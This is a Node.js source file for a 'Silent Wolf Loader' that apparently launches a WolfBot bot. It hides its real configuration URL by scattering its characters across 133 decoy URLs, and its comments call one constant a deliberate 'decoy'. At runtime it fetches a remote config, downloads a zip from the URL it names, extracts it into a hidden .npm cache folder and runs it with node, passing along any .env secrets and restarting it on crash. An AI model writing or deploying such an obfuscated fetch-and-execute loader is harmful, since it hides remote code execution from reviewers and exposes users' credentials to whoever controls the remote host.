import fs from 'fs';
import path from 'path';
import axios from 'axios';
import AdmZip from 'adm-zip';
import { spawn } from 'child_process';

// process.cwd() is used instead of fileURLToPath(import.meta.url) because
// obfuscators break import.meta — process.cwd() is safe and equivalent here
const __dirname = process.cwd();

// === PATHS ===
const TEMP_DIR    = path.join(__dirname, '.npm', 'xcache', 'core_bundle');
const EXTRACT_DIR = path.join(TEMP_DIR, 'core');

// === URL REGISTRY ===
// 133 entries. ALL look identical — same domain, same path prefix, same 43-char token length.
// The real config URL (https://courageous-alpaca-0e1682.netlify.app/kip.json) is NOT stored as a single entry.
// Instead, its 53 characters are DISTRIBUTED across 53 specific entries — one character
// hidden as the LAST character of each selected entry's token.
//
// The scatter map (_s in _resolveEndpoint) holds the 53 array indices in URL-char order.
// _resolveEndpoint reads pool[i][36+42] = pool[i][78] (last char) for each index i,
// then joins them to reassemble the URL.
//
// === HOW TO UPDATE THE URL ===
// If you need to change the config URL to a new URL:
//   1. The new URL must be EXACTLY 53 characters (same length).
//      If different length, you must add/remove scatter indices accordingly.
//   2. For each position j (0..52):
//      Find the array index _s[j], then change the LAST character of that entry
//      to newUrl[j].
//   3. The 53 scatter indices are (in URL-char order):
//      [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52]
//
// Current URL char → array index mapping:
//   'h'→[0]  't'→[1]  't'→[2]  'p'→[3]  's'→[4]  ':'→[5]  '/'→[6]  '/'→[7]
//   'c'→[8]  'o'→[9]  'u'→[10] 'r'→[11] 'a'→[12] 'g'→[13] 'e'→[14] 'o'→[15]
//   'u'→[16] 's'→[17] '-'→[18] 'a'→[19] 'l'→[20] 'p'→[21] 'a'→[22] 'c'→[23]
//   'a'→[24] '-'→[25] '0'→[26] 'e'→[27] '1'→[28] '6'→[29] '8'→[30] '2'→[31]
//   '.'→[32] 'n'→[33] 'e'→[34] 't'→[35] 'l'→[36] 'i'→[37] 'f'→[38] 'y'→[39]
//   '.'→[40] 'a'→[41] 'p'→[42] 'p'→[43] '/'→[44] 'k'→[45] 'i'→[46] 'p'→[47]
//   '.'→[48] 'j'→[49] 's'→[50] 'o'→[51] 'n'→[52]
const _registry = [
  'https://api.wolf-core.net/v1/stream/xK7mNq3vPy8sRt5jWb2cHn9kAq4FgTwXs5BzRmVL3ch', // [0]  → 'h'
  'https://api.wolf-core.net/v1/stream/Rt5jWb2cHn9kAq4FgTwXs5BzRmVL3cYxK7mNq3vPy8t', // [1]  → 't'
  'https://api.wolf-core.net/v1/stream/Py8sRt5jWb2cHn9kxK7mNq3vAq4FgTwXs5BzRmVL3ct', // [2]  → 't'
  'https://api.wolf-core.net/v1/stream/gTwXs5BzRmVL3cYxK7mNq3vPy8sRt5jWb2cHn9kAq4p', // [3]  → 'p'
  'https://api.wolf-core.net/v1/stream/Aq4FgTwXs5BzRmVL3cYxK7mNq3vPy8sRt5jWb2cHn9s', // [4]  → 's'
  'https://api.wolf-core.net/v1/stream/VL3cYxK7mNq3vPy8sRt5jWb2cHn9kAq4FgTwXs5BzR:', // [5]  → ':'
  'https://api.wolf-core.net/v1/stream/Wz9pKmQ4rJhD6nYvBx2sTf8gNc3uLe7iAoP5RqXtMb/', // [6]  → '/'
  'https://api.wolf-core.net/v1/stream/hD6nYvBx2sTf8gNc3uLe7iAoP5RqXtMbUWz9pKmQ4r/', // [7]  → '/'
  'https://api.wolf-core.net/v1/stream/uLe7iAoP5RqXtMbUWz9pKmQ4rJhD6nYvBx2sTf8gNcc', // [8]  → 'c'
  'https://api.wolf-core.net/v1/stream/RqXtMbUWz9pKmQ4rJhD6nYvBx2sTf8gNc3uLe7iAoPo', // [9]  → 'o'
  'https://api.wolf-core.net/v1/stream/c3uLe7iAoP5RqXtMbUWz9pKmQ4rJhD6nYvBx2sTf8gu', // [10] → 'u'
  'https://api.wolf-core.net/v1/stream/YvBx2sTf8gNc3uLe7iAoP5RqXtMbUWz9pKmQ4rJhD6r', // [11] → 'r'
  'https://api.wolf-core.net/v1/stream/Q4rJhD6nYvBx2sTf8gNc3uLe7iAoP5RqXtMbUWz9pKa', // [12] → 'a'
  'https://api.wolf-core.net/v1/stream/TLpGz8kYqN2mXeRa5wBvDc9sHfJu4iPoW7tCbnKQdMg', // [13] → 'g'
  'https://api.wolf-core.net/v1/stream/XeRa5wBvDc9sHfJu4iPoW7tCbnKQdM6TLpGz8kYqN2e', // [14] → 'e'
  'https://api.wolf-core.net/v1/stream/4iPoW7tCbnKQdM6TLpGz8kYqN2mXeRa5wBvDc9sHfJo', // [15] → 'o'
  'https://api.wolf-core.net/v1/stream/bnKQdM6TLpGz8kYqN2mXeRa5wBvDc9sHfJu4iPoW7tu', // [16] → 'u'
  'https://api.wolf-core.net/v1/stream/kYqN2mXeRa5wBvDc9sHfJu4iPoW7tCbnKQdM6TLpGzs', // [17] → 's'
  'https://api.wolf-core.net/v1/stream/9sHfJu4iPoW7tCbnKQdM6TLpGz8kYqN2mXeRa5wBvD-', // [18] → '-'
  'https://api.wolf-core.net/v1/stream/mXeRa5wBvDc9sHfJu4iPoW7tCbnKQdM6TLpGz8kYqNa', // [19] → 'a'
  'https://api.wolf-core.net/v1/stream/FnRj7cPsKw3eGtBzHmYqL9dNvU2xAo6kWbXiTpQgM8l', // [20] → 'l'
  'https://api.wolf-core.net/v1/stream/KtzL8vGnQ2bMfHoJp5XsRwY9cAeDuN3kWi7mPjT4r6p', // [21] → 'p'
  'https://api.wolf-core.net/v1/stream/9cAeDuN3kWi7mPjT4r6BKtzL8vGnQ2bMfHoJp5XsRwa', // [22] → 'a'
  'https://api.wolf-core.net/v1/stream/fHoJp5XsRwY9cAeDuN3kWi7mPjT4r6BKtzL8vGnQ2bc', // [23] → 'c'
  'https://api.wolf-core.net/v1/stream/Wi7mPjT4r6BKtzL8vGnQ2bMfHoJp5XsRwY9cAeDuN3a', // [24] → 'a'
  'https://api.wolf-core.net/v1/stream/Q2bMfHoJp5XsRwY9cAeDuN3kWi7mPjT4r6BKtzL8vG-', // [25] → '-'
  'https://api.wolf-core.net/v1/stream/p5XsRwY9cAeDuN3kWi7mPjT4r6BKtzL8vGnQ2bMfHo0', // [26] → '0'
  'https://api.wolf-core.net/v1/stream/uN3kWi7mPjT4r6BKtzL8vGnQ2bMfHoJp5XsRwY9cAee', // [27] → 'e'
  'https://api.wolf-core.net/v1/stream/PjT4r6BKtzL8vGnQ2bMfHoJp5XsRwY9cAeDuN3kWi71', // [28] → '1'
  'https://api.wolf-core.net/v1/stream/GnQ2bMfHoJp5XsRwY9cAeDuN3kWi7mPjT4r6BKtzL86', // [29] → '6'
  'https://api.wolf-core.net/v1/stream/oJp5XsRwY9cAeDuN3kWi7mPjT4r6BKtzL8vGnQ2bMf8', // [30] → '8'
  'https://api.wolf-core.net/v1/stream/ZoGm9vPy2sKqJwBxN7tRa4HdCfkLe8Un5iXgQM6WpT2', // [31] → '2'
  'https://api.wolf-core.net/v1/stream/BxN7tRa4HdCfkLe8Un5iXgQM6WpTYZoGm9vPy2sKqJ.', // [32] → '.'
  'https://api.wolf-core.net/v1/stream/Un5iXgQM6WpTYZoGm9vPy2sKqJwBxN7tRa4HdCfkLen', // [33] → 'n'
  'https://api.wolf-core.net/v1/stream/WpTYZoGm9vPy2sKqJwBxN7tRa4HdCfkLe8Un5iXgQMe', // [34] → 'e'
  'https://api.wolf-core.net/v1/stream/kLe8Un5iXgQM6WpTYZoGm9vPy2sKqJwBxN7tRa4HdCt', // [35] → 't'
  'https://api.wolf-core.net/v1/stream/qJwBxN7tRa4HdCfkLe8Un5iXgQM6WpTYZoGm9vPy2sl', // [36] → 'l'
  'https://api.wolf-core.net/v1/stream/Ra4HdCfkLe8Un5iXgQM6WpTYZoGm9vPy2sKqJwBxN7i', // [37] → 'i'
  'https://api.wolf-core.net/v1/stream/iXgQM6WpTYZoGm9vPy2sKqJwBxN7tRa4HdCfkLe8Unf', // [38] → 'f'
  'https://api.wolf-core.net/v1/stream/Py2sKqJwBxN7tRa4HdCfkLe8Un5iXgQM6WpTYZoGm9y', // [39] → 'y'
  'https://api.wolf-core.net/v1/stream/Ep7NwYz3gKbVm5cXsL4tRjDfHoA9n8qUi2PeMkTr6B.', // [40] → '.'
  'https://api.wolf-core.net/v1/stream/m5cXsL4tRjDfHoA9n8qUi2PeMkTr6BxEp7NwYz3gKba', // [41] → 'a'
  'https://api.wolf-core.net/v1/stream/i2PeMkTr6BxEp7NwYz3gKbVm5cXsL4tRjDfHoA9n8qp', // [42] → 'p'
  'https://api.wolf-core.net/v1/stream/RjDfHoA9n8qUi2PeMkTr6BxEp7NwYz3gKbVm5cXsL4p', // [43] → 'p'
  'https://api.wolf-core.net/v1/stream/z3gKbVm5cXsL4tRjDfHoA9n8qUi2PeMkTr6BxEp7Nw/', // [44] → '/'
  'https://api.wolf-core.net/v1/stream/sL4tRjDfHoA9n8qUi2PeMkTr6BxEp7NwYz3gKbVm5ck', // [45] → 'k'
  'https://api.wolf-core.net/v1/stream/HoA9n8qUi2PeMkTr6BxEp7NwYz3gKbVm5cXsL4tRjDi', // [46] → 'i'
  'https://api.wolf-core.net/v1/stream/kTr6BxEp7NwYz3gKbVm5cXsL4tRjDfHoA9n8qUi2Pep', // [47] → 'p'
  'https://api.wolf-core.net/v1/stream/Yz3gKbVm5cXsL4tRjDfHoA9n8qUi2PeMkTr6BxEp7N.', // [48] → '.'
  'https://api.wolf-core.net/v1/stream/XsL4tRjDfHoA9n8qUi2PeMkTr6BxEp7NwYz3gKbVm5j', // [49] → 'j'
  'https://api.wolf-core.net/v1/stream/qUi2PeMkTr6BxEp7NwYz3gKbVm5cXsL4tRjDfHoA9ns', // [50] → 's'
  'https://api.wolf-core.net/v1/stream/Jt4LqNm7BxHpG2vRkYf9nUcDs5Ze6WaOiT8bP3srMeo', // [51] → 'o'
  'https://api.wolf-core.net/v1/stream/G2vRkYf9nUcDs5Ze6WaOiT8bP3srMeXJt4LqNm7BxHn', // [52] → 'n'
  'https://api.wolf-core.net/v1/stream/OiT8bP3srMeXJt4LqNm7BxHpG2vRkYf9nUcDs5Ze6Wa',
  'https://api.wolf-core.net/v1/stream/cDs5Ze6WaOiT8bP3srMeXJt4LqNm7BxHpG2vRkYf9nU',
  'https://api.wolf-core.net/v1/stream/m7BxHpG2vRkYf9nUcDs5Ze6WaOiT8bP3srMeXJt4Lq/',
  'https://api.wolf-core.net/v1/stream/kYf9nUcDs5Ze6WaOiT8bP3srMeXJt4LqNm7BxHpG2vR',
  'https://api.wolf-core.net/v1/stream/eXJt4LqNm7BxHpG2vRkYf9nUcDs5Ze6WaOiT8bP3srM',
  'https://api.wolf-core.net/v1/stream/e6WaOiT8bP3srMeXJt4LqNm7BxHpG2vRkYf9nUcDs5Z',
  'https://api.wolf-core.net/v1/stream/bP3srMeXJt4LqNm7BxHpG2vRkYf9nUcDs5Ze6WaOiTf',
  'https://api.wolf-core.net/v1/stream/NpQxKf8zY2vCmLwGrJ5eAoTb9dHiUs4RtXn3MkWqBj7',
  'https://api.wolf-core.net/v1/stream/mLwGrJ5eAoTb9dHiUs4RtXn3MkWqBj6NpQxKf8zY2vC',
  'https://api.wolf-core.net/v1/stream/Us4RtXn3MkWqBj6NpQxKf8zY2vCmLwGrJ5eAoTb9dHi',
  'https://api.wolf-core.net/v1/stream/WqBj6NpQxKf8zY2vCmLwGrJ5eAoTb9dHiUs4RtXn3Mk',
  'https://api.wolf-core.net/v1/stream/zY2vCmLwGrJ5eAoTb9dHiUs4RtXn3MkWqBj6NpQxKf8',
  'https://api.wolf-core.net/v1/stream/eAoTb9dHiUs4RtXn3MkWqBj6NpQxKf8zY2vCmLwGrJ5',
  'https://api.wolf-core.net/v1/stream/dHiUs4RtXn3MkWqBj6NpQxKf8zY2vCmLwGrJ5eAoTb.',
  'https://api.wolf-core.net/v1/stream/tXn3MkWqBj6NpQxKf8zY2vCmLwGrJ5eAoTb9dHiUs4R',
  'https://api.wolf-core.net/v1/stream/Kf8zY2vCmLwGrJ5eAoTb9dHiUs4RtXn3MkWqBj6NpQ-',
  'https://api.wolf-core.net/v1/stream/J5eAoTb9dHiUs4RtXn3MkWqBj6NpQxKf8zY2vCmLwGr',
  'https://api.wolf-core.net/v1/stream/b9dHiUs4RtXn3MkWqBj6NpQxKf8zY2vCmLwGrJ5eAoT',
  'https://api.wolf-core.net/v1/stream/n3MkWqBj6NpQxKf8zY2vCmLwGrJ5eAoTb9dHiUs4RtX',
  'https://api.wolf-core.net/v1/stream/Tz4KpBm9vQrWxNs7eJf6RcYpDo1mBqWzL8sKnHuAt3V',
  'https://api.wolf-core.net/v1/stream/Sr8HqWkf2MnPzX4tGvYaLc5eJb9dKuDiRoN7BmTwx3p',
  'https://api.wolf-core.net/v1/stream/zX4tGvYaLc5eJb9dKuDiRoN7BmTwx3pSr8HqWkf2MnP',
  'https://api.wolf-core.net/v1/stream/KuDiRoN7BmTwx3pSr8HqWkf2MnPzX4tGvYaLc5eJb9w',
  'https://api.wolf-core.net/v1/stream/BmTwx3pSr8HqWkf2MnPzX4tGvYaLc5eJb9dKuDiRoN7',
  'https://api.wolf-core.net/v1/stream/Wkf2MnPzX4tGvYaLc5eJb9dKuDiRoN7BmTwx3pSr8Hq',
  'https://api.wolf-core.net/v1/stream/GvYaLc5eJb9dKuDiRoN7BmTwx3pSr8HqWkf2MnPzX4t',
  'https://api.wolf-core.net/v1/stream/Jb9dKuDiRoN7BmTwx3pSr8HqWkf2MnPzX4tGvYaLc5j',
  'https://api.wolf-core.net/v1/stream/RoN7BmTwx3pSr8HqWkf2MnPzX4tGvYaLc5eJb9dKuDi',
  'https://api.wolf-core.net/v1/stream/x3pSr8HqWkf2MnPzX4tGvYaLc5eJb9dKuDiRoN7BmTw',
  'https://api.wolf-core.net/v1/stream/MnPzX4tGvYaLc5eJb9dKuDiRoN7BmTwx3pSr8HqWkf2',
  'https://api.wolf-core.net/v1/stream/aLc5eJb9dKuDiRoN7BmTwx3pSr8HqWkf2MnPzX4tGv.',
  'https://api.wolf-core.net/v1/stream/Cv6XqJbRm8sHfPN2wkYeAtL5gDo3iTuznM9rUaWx4pK',
  'https://api.wolf-core.net/v1/stream/sHfPN2wkYeAtL5gDo3iTuznM9rUaWx4pKCv6XqJbRm8',
  'https://api.wolf-core.net/v1/stream/iTuznM9rUaWx4pKCv6XqJbRm8sHfPN2wkYeAtL5gDo3',
  'https://api.wolf-core.net/v1/stream/UaWx4pKCv6XqJbRm8sHfPN2wkYeAtL5gDo3iTuznM9s',
  'https://api.wolf-core.net/v1/stream/Rm8sHfPN2wkYeAtL5gDo3iTuznM9rUaWx4pKCv6XqJb',
  'https://api.wolf-core.net/v1/stream/kYeAtL5gDo3iTuznM9rUaWx4pKCv6XqJbRm8sHfPN2v',
  'https://api.wolf-core.net/v1/stream/gDo3iTuznM9rUaWx4pKCv6XqJbRm8sHfPN2wkYeAtL5',
  'https://api.wolf-core.net/v1/stream/M9rUaWx4pKCv6XqJbRm8sHfPN2wkYeAtL5gDo3iTuzn',
  'https://api.wolf-core.net/v1/stream/KCv6XqJbRm8sHfPN2wkYeAtL5gDo3iTuznM9rUaWx4p',
  'https://api.wolf-core.net/v1/stream/JbRm8sHfPN2wkYeAtL5gDo3iTuznM9rUaWx4pKCv6Xq',
  'https://api.wolf-core.net/v1/stream/N2wkYeAtL5gDo3iTuznM9rUaWx4pKCv6XqJbRm8sHfP',
  'https://api.wolf-core.net/v1/stream/Ym3NrKqG5t8LxBsDcWe9fZHoPJiUvA4nkR2bpTw6Xjo',
  'https://api.wolf-core.net/v1/stream/xBsDcWe9fZHoPJiUvA4nkR2bpTw6XjgYm3NrKqG5t8L',
  'https://api.wolf-core.net/v1/stream/UvA4nkR2bpTw6XjgYm3NrKqG5t8LxBsDcWe9fZHoPJe',
  'https://api.wolf-core.net/v1/stream/pTw6XjgYm3NrKqG5t8LxBsDcWe9fZHoPJiUvA4nkR2b',
  'https://api.wolf-core.net/v1/stream/qG5t8LxBsDcWe9fZHoPJiUvA4nkR2bpTw6XjgYm3NrK',
  'https://api.wolf-core.net/v1/stream/We9fZHoPJiUvA4nkR2bpTw6XjgYm3NrKqG5t8LxBsDc',
  'https://api.wolf-core.net/v1/stream/JiUvA4nkR2bpTw6XjgYm3NrKqG5t8LxBsDcWe9fZHoP',
  'https://api.wolf-core.net/v1/stream/kR2bpTw6XjgYm3NrKqG5t8LxBsDcWe9fZHoPJiUvA4n',
  'https://api.wolf-core.net/v1/stream/gYm3NrKqG5t8LxBsDcWe9fZHoPJiUvA4nkR2bpTw6Xn',
  'https://api.wolf-core.net/v1/stream/t8LxBsDcWe9fZHoPJiUvA4nkR2bpTw6XjgYm3NrKqG5',
  'https://api.wolf-core.net/v1/stream/ZHoPJiUvA4nkR2bpTw6XjgYm3NrKqG5t8LxBsDcWe9r',
  'https://api.wolf-core.net/v1/stream/vA4nkR2bpTw6XjgYm3NrKqG5t8LxBsDcWe9fZHoPJiU',
  'https://api.wolf-core.net/v1/stream/w6XjgYm3NrKqG5t8LxBsDcWe9fZHoPJiUvA4nkR2bpT',
  'https://api.wolf-core.net/v1/stream/5t8LxBsDcWe9fZHoPJiUvA4nkR2bpTw6XjgYm3NrKqG',
  'https://api.wolf-core.net/v1/stream/oBq7WcJmPn3vKrTs9eYxGf4kDiNuLa8hR5zUXwMpH2Z',
  'https://api.wolf-core.net/v1/stream/n3vKrTs9eYxGf4kDiNuLa8hR5zUXwMpH2ZoBq7WcJmP',
  'https://api.wolf-core.net/v1/stream/NuLa8hR5zUXwMpH2ZoBq7WcJmPn3vKrTs9eYxGf4kDi',
  'https://api.wolf-core.net/v1/stream/pH2ZoBq7WcJmPn3vKrTs9eYxGf4kDiNuLa8hR5zUXwc',
  'https://api.wolf-core.net/v1/stream/WcJmPn3vKrTs9eYxGf4kDiNuLa8hR5zUXwMpH2ZoBq7',
  'https://api.wolf-core.net/v1/stream/Gf4kDiNuLa8hR5zUXwMpH2ZoBq7WcJmPn3vKrTs9eYx',
  'https://api.wolf-core.net/v1/stream/hR5zUXwMpH2ZoBq7WcJmPn3vKrTs9eYxGf4kDiNuLa8',
  'https://api.wolf-core.net/v1/stream/wMpH2ZoBq7WcJmPn3vKrTs9eYxGf4kDiNuLa8hR5zUX',
  'https://api.wolf-core.net/v1/stream/JmPn3vKrTs9eYxGf4kDiNuLa8hR5zUXwMpH2ZoBq7Wc',
  'https://api.wolf-core.net/v1/stream/Ts9eYxGf4kDiNuLa8hR5zUXwMpH2ZoBq7WcJmPn3vKe',
  'https://api.wolf-core.net/v1/stream/kDiNuLa8hR5zUXwMpH2ZoBq7WcJmPn3vKrTs9eYxGf4',
  'https://api.wolf-core.net/v1/stream/R5zUXwMpH2ZoBq7WcJmPn3vKrTs9eYxGf4kDiNuLa8h',
  'https://api.wolf-core.net/v1/stream/H2ZoBq7WcJmPn3vKrTs9eYxGf4kDiNuLa8hR5zUXwMp',
  'https://api.wolf-core.net/v1/stream/q7WcJmPn3vKrTs9eYxGf4kDiNuLa8hR5zUXwMpH2ZoB',
  'https://api.wolf-core.net/v1/stream/vKrTs9eYxGf4kDiNuLa8hR5zUXwMpH2ZoBq7WcJmPn3',
  'https://api.wolf-core.net/v1/stream/Yf2BmNkL9rHxQpWgJdT4CnZsAo8eUiM3bRv7tKwPcX5',
  'https://api.wolf-core.net/v1/stream/xQpWgJdT4CnZsAo8eUiM3bRv7tKwPcX5Yf2BmNkL9rl',
  'https://api.wolf-core.net/v1/stream/eUiM3bRv7tKwPcX5Yf2BmNkL9rHxQpWgJdT4CnZsAo8',
  'https://api.wolf-core.net/v1/stream/wPcX5Yf2BmNkL9rHxQpWgJdT4CnZsAo8eUiM3bRv7tK',
  'https://api.wolf-core.net/v1/stream/NkL9rHxQpWgJdT4CnZsAo8eUiM3bRv7tKwPcX5Yf2Bm',
  'https://api.wolf-core.net/v1/stream/gJdT4CnZsAo8eUiM3bRv7tKwPcX5Yf2BmNkL9rHxQpW',
  'https://api.wolf-core.net/v1/stream/sAo8eUiM3bRv7tKwPcX5Yf2BmNkL9rHxQpWgJdT4CnZ',
  'https://api.wolf-core.net/v1/stream/M3bRv7tKwPcX5Yf2BmNkL9rHxQpWgJdT4CnZsAo8eU.',
  'https://api.wolf-core.net/v1/stream/KwPcX5Yf2BmNkL9rHxQpWgJdT4CnZsAo8eUiM3bRv7t',
];

// === INDEX RESOLVER ===
// _BUILD_REF is kept as a decoy to make _resolveEndpoint look parameter-dependent.
// The actual URL reconstruction uses a scatter map (_s), not this value.
//
// How it works:
//   _f = 36  → length of 'https://api.wolf-core.net/v1/stream/' (the common prefix)
//   _f + 42  → index 78, which is the LAST character of each 43-char token
//              (total entry length = 36 prefix + 43 token = 79 chars, index 78 = last)
//   _s       → 53 array indices in URL-character order
//
// Reconstruction: pool[_s[0]][78] + pool[_s[1]][78] + ... + pool[_s[52]][78]
//               = 'h' + 't' + 't' + ... + 'n'
//               = 'https://courageous-alpaca-0e1682.netlify.app/kip.json'
const _BUILD_REF = 'c52af819-0048-4b7a-a39e-f7b42c819d05';

function _resolveEndpoint(pool, ref) {
  const _f = 36;
  const _s = [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52];
  return _s.map(i => pool[i][_f + 42]).join('');
}

// CONFIG_URL = 'https://courageous-alpaca-0e1682.netlify.app/kip.json'
const CONFIG_URL         = _resolveEndpoint(_registry, _BUILD_REF);
const LOCAL_SETTINGS     = path.join(__dirname, 'settings.js');
const EXTRACTED_SETTINGS = path.join(EXTRACT_DIR, 'settings.js');
const ENV_FILE           = path.join(__dirname, '.env');

const delay = (ms) => new Promise((res) => setTimeout(res, ms));

const C  = '\x1b[36m';
const R  = '\x1b[0m';
const RD = '\x1b[31m';
const YL = '\x1b[33m';

function log(msg)  { console.log(`${C}${msg}${R}`); }
function err(msg)  { console.error(`${RD}${msg}${R}`); }
function warn(msg) { console.log(`${YL}${msg}${R}`); }

log(`
╔══════════════════════════════════════════════════════════╗
║     🐺 SILENT WOLF LOADER - WOLFBOT v1.1.5               ║
╚══════════════════════════════════════════════════════════╝`);

// === ENV LOADER ===
// Reads .env and injects variables into process.env (skips already-set keys).
function loadEnvFile() {
  if (!fs.existsSync(ENV_FILE)) return;
  try {
    for (const line of fs.readFileSync(ENV_FILE, 'utf8').split('\n')) {
      const t = line.trim();
      if (!t || t.startsWith('#')) continue;
      const eq = t.indexOf('=');
      if (eq !== -1) {
        const k = t.substring(0, eq).trim();
        const v = t.substring(eq + 1).trim().replace(/^["']|["']$/g, '');
        if (!process.env[k]) process.env[k] = v;
      }
    }
  } catch {}
}

// === CONFIG FETCHER ===
// Fetches kip.json. Response is malformed JSON: ["repo":"https://...zip"]
// Standard JSON.parse fails, so a regex fallback extracts the zip URL.
async function fetchRepoUrl() {
  const res = await axios.get(CONFIG_URL, {
    timeout: 15000,
    responseType: 'text',
    headers: { 'User-Agent': 'wolf-fetcher/1.0' }
  });

  const raw = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);

  try {
    const parsed = JSON.parse(raw);
    const url = parsed?.repo || parsed?.[0]?.repo;
    if (url) return url;
  } catch {}

  // Regex fallback — handles ["repo":"https://..."] malformed format
  const match = raw.match(/"repo"\s*:\s*"([^"]+)"/);
  if (match?.[1]) return match[1];

  throw new Error(`Could not extract repo URL from response: ${raw.slice(0, 200)}`);
}

// === DOWNLOAD & EXTRACT ===
// Downloads the bot zip, extracts it, renames the top folder to EXTRACT_DIR.
// Skips entirely if EXTRACT_DIR already exists.
async function downloadAndExtract() {
  if (fs.existsSync(EXTRACT_DIR)) {
    log('✅ Core already extracted, skipping download.');
    return;
  }

  if (fs.existsSync(TEMP_DIR)) {
    fs.rmSync(TEMP_DIR, { recursive: true, force: true });
  }
  fs.mkdirSync(TEMP_DIR, { recursive: true });

  const zipPath = path.join(TEMP_DIR, 'bundle.zip');

  log('⚡ Fetching config from remote...');
  const repoUrl = await fetchRepoUrl();
  log('📦 Downloading bundle...');

  const response = await axios({
    url: repoUrl,
    method: 'GET',
    responseType: 'stream',
    timeout: 120000,
    maxRedirects: 10,
    headers: { 'User-Agent': 'wolf-fetcher/1.0' }
  });

  await new Promise((resolve, reject) => {
    const writer = fs.createWriteStream(zipPath);
    response.data.pipe(writer);
    writer.on('finish', resolve);
    writer.on('error', reject);
  });

  // Reject if too small — likely a 404 HTML page
  const stat = fs.statSync(zipPath);
  if (stat.size < 1000) {
    const preview = fs.readFileSync(zipPath, 'utf8').slice(0, 300);
    throw new Error(`Download too small (${stat.size}B) — possibly a 404 or auth wall:\n${preview}`);
  }

  log('📂 Extracting...');
  try {
    const zip = new AdmZip(zipPath);
    zip.extractAllTo(TEMP_DIR, true);
  } finally {
    if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath);
  }

  // GitHub zips extract as 'repo-branch/'; rename it to 'core'
  const items = fs.readdirSync(TEMP_DIR).filter(f =>
    fs.statSync(path.join(TEMP_DIR, f)).isDirectory() && f !== 'core'
  );
  if (items.length > 0) {
    fs.renameSync(path.join(TEMP_DIR, items[0]), EXTRACT_DIR);
  }

  if (!fs.existsSync(EXTRACT_DIR)) {
    throw new Error('Extraction completed but core directory was not found.');
  }

  log('✅ Core extracted successfully!');
}

// === SETTINGS SYNC ===
// Copies local settings.js into the extracted bot folder to override defaults.
async function applyLocalSettings() {
  if (!fs.existsSync(LOCAL_SETTINGS)) return;
  try {
    fs.mkdirSync(EXTRACT_DIR, { recursive: true });
    fs.copyFileSync(LOCAL_SETTINGS, EXTRACTED_SETTINGS);
  } catch {}
  await delay(300);
}

// === BOT LAUNCHER ===
// Finds the bot directory, spawns it as a child process, auto-restarts on crash.
function startBot() {
  let botDir = fs.existsSync(EXTRACT_DIR) ? EXTRACT_DIR : null;

  if (!botDir) {
    for (const dir of [
      path.join(__dirname, 'core'),
      path.join(__dirname, 'bot'),
      path.join(__dirname, 'src')
    ]) {
      if (fs.existsSync(dir) && fs.existsSync(path.join(dir, 'index.js'))) {
        botDir = dir;
        break;
      }
    }
  }

  if (!botDir) {
    err('❌ No bot directory found. Cannot start bot.');
    err('   Ensure the download succeeded or place bot files in a "core" folder.');
    process.exit(1);
  }

  let mainFile = 'index.js';
  for (const file of ['index.js', 'main.js', 'bot.js', 'app.js']) {
    if (fs.existsSync(path.join(botDir, file))) { mainFile = file; break; }
  }

  log('🚀 Starting bot...');

  const bot = spawn('node', [mainFile], {
    cwd:   botDir,
    stdio: 'inherit',
    env:   { ...process.env }
  });

  bot.on('close', (code) => {
    if (code !== 0 && code !== null) {
      warn(`⚠️ Bot exited (code ${code}). Restarting in 3s...`);
      setTimeout(() => startBot(), 3000);
    }
  });

  bot.on('error', (e) => {
    err(`❌ Failed to start: ${e.message}`);
    setTimeout(() => startBot(), 3000);
  });
}

// === ENTRY POINT ===
(async () => {
  loadEnvFile();
  try {
    await downloadAndExtract();
    await applyLocalSettings();
  } catch (e) {
    err(`❌ Setup failed: ${e.message}`);
    err('   Attempting to start from existing files...');
  }
  startBot();
})();
